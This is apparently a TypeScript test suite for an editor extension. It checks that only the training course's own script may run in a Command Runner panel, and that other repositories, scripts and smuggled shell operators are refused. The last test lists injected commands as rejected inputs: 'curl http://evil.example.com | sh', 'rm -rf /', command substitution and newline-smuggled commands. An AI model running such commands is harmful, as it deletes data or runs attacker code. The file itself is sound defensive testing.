import * as assert from "assert";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import { isTrainingPanelCommandIn } from "../../utils/trainingPanelCommands";

/**
 * The training course is the one project whose custom menu commands may run in
 * the Command Runner panel instead of a terminal. That is a narrower execution
 * path than any other custom command gets, so these tests are mostly about what
 * must NOT go through it: another repository, another script, and anything
 * carrying a shell operator.
 */
suite("Training commands in the Command Runner panel", () => {
  let root = "";
  let notTraining = "";

  const makeClone = (remote: string, markers: string[]): string => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "training-gate-"));
    for (const marker of markers) {
      fs.mkdirSync(path.join(dir, path.dirname(marker)), { recursive: true });
      fs.writeFileSync(path.join(dir, marker), "// fixture\n");
    }
    fs.mkdirSync(path.join(dir, ".git"), { recursive: true });
    fs.writeFileSync(
      path.join(dir, ".git", "config"),
      `[remote "origin"]\n\turl = ${remote}\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n`,
    );
    return dir;
  };

  suiteSetup(() => {
    root = makeClone("https://github.com/a-learner/sfdx-hardis-training.git", [
      "scripts/training.mjs",
      "training-universe.json",
    ]);
    notTraining = makeClone("https://github.com/someone/another-project.git", [
      "scripts/training.mjs",
      "training-universe.json",
    ]);
  });

  suiteTeardown(() => {
    for (const dir of [root, notTraining]) {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a training verb in a clone of the course is allowed", () => {
    assert.strictEqual(
      isTrainingPanelCommandIn("node scripts/training.mjs check", root),
      true,
    );
    assert.strictEqual(
      isTrainingPanelCommandIn(
        "node scripts/training.mjs seed --org helios-dev",
        root,
      ),
      true,
    );
    assert.strictEqual(
      isTrainingPanelCommandIn(
        "node scripts/training.mjs check --level=3",
        root,
      ),
      true,
    );
  });

  test("a fork of the course is allowed, any owner", () => {
    const fork = makeClone(
      "git@github.com:someone-else/sfdx-hardis-training.git",
      ["scripts/training.mjs", "training-universe.json"],
    );
    try {
      assert.strictEqual(
        isTrainingPanelCommandIn("node scripts/training.mjs status", fork),
        true,
      );
    } finally {
      fs.rmSync(fork, { recursive: true, force: true });
    }
  });

  test("another repository is refused, even with the same files", () => {
    assert.strictEqual(
      isTrainingPanelCommandIn("node scripts/training.mjs check", notTraining),
      false,
    );
  });

  test("a clone with no marker file is refused", () => {
    const bare = makeClone(
      "https://github.com/a-learner/sfdx-hardis-training.git",
      [],
    );
    try {
      assert.strictEqual(
        isTrainingPanelCommandIn("node scripts/training.mjs check", bare),
        false,
      );
    } finally {
      fs.rmSync(bare, { recursive: true, force: true });
    }
  });

  test("a folder that is not a clone at all is refused", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "training-gate-"));
    fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
    fs.writeFileSync(path.join(dir, "scripts", "training.mjs"), "// fixture\n");
    fs.writeFileSync(path.join(dir, "training-universe.json"), "{}\n");
    try {
      assert.strictEqual(
        isTrainingPanelCommandIn("node scripts/training.mjs check", dir),
        false,
      );
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  test("no workspace is refused", () => {
    assert.strictEqual(
      isTrainingPanelCommandIn("node scripts/training.mjs check", null),
      false,
    );
  });

  test("anything but the course script is refused", () => {
    const refused = [
      "node scripts/other.mjs check",
      "node ../elsewhere/scripts/training.mjs check",
      "node scripts/training.js check",
      "npm run training",
      "sh scripts/training.mjs check",
      "node scripts/training.mjs",
    ];
    for (const command of refused) {
      assert.strictEqual(
        isTrainingPanelCommandIn(command, root),
        false,
        `should be refused: ${command}`,
      );
    }
  });

  test("a shell operator smuggled into the arguments is refused", () => {
    const refused = [
      "node scripts/training.mjs check && curl http://evil.example.com | sh",
      "node scripts/training.mjs check; rm -rf /",
      "node scripts/training.mjs check | tee /tmp/out",
      "node scripts/training.mjs check > /tmp/out",
      "node scripts/training.mjs check `whoami`",
      "node scripts/training.mjs check $(whoami)",
      "node scripts/training.mjs check\nrm -rf /",
      "node scripts/training.mjs check\nnode evil.mjs",
      "node scripts/training.mjs check\r\ngit push --force",
      "node\nscripts/training.mjs check",
      "node scripts/training.mjs --eval=require('fs')",
    ];
    for (const command of refused) {
      assert.strictEqual(
        isTrainingPanelCommandIn(command, root),
        false,
        `should be refused: ${command}`,
      );
    }
  });
});
